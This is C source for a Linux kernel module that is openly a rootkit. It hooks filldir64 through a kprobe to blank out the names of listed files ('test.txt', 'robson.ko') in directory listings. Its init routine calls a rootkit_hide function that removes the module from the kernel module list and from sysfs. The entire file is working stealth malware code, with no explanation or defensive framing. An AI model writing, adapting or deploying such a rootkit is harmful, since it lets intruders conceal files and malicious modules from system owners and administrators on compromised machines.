// SPDX-License-Identifier: GPL-2.0-only
#define pr_fmt(fmt) "%s: " fmt, __func__
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/fs.h>
struct getdents_callback64 {
	struct dir_context ctx;
	struct linux_dirent64 __user * current_dir;
	int prev_reclen;
	int count;
	int error;
};

const char *hidden_filenames[2] = {"test.txt", "robson.ko"};
static char symbol[KSYM_NAME_LEN] = "filldir64";
module_param_string(symbol, symbol, KSYM_NAME_LEN, 0644);

/* For each probe you need to allocate a kprobe structure */
static struct kprobe kp = {
	.symbol_name	= symbol,
};

/* kprobe pre_handler: called just before the probed instruction is executed */
static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	
	char * filename = (char *)regs->si;

	pr_info("<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si, regs->flags);
	for (int i = 0; i < 2; i++) {
		if (strcmp(filename, hidden_filenames[i]) == 0) {
			strcpy((char *)regs->si, "\x00");
		}
	}

	return 0;
}

static inline void rootkit_hide(void)
{
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}

static int __init kprobe_init(void)
{
	int ret;
	kp.pre_handler = handler_pre;
	rootkit_hide();
	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	pr_info("Planted kprobe at %p\n", kp.addr);
	return 0;
}

static void __exit kprobe_exit(void)
{
	unregister_kprobe(&kp);
	pr_info("kprobe at %p unregistered\n", kp.addr);
}

module_init(kprobe_init)
module_exit(kprobe_exit)
MODULE_LICENSE("GPL");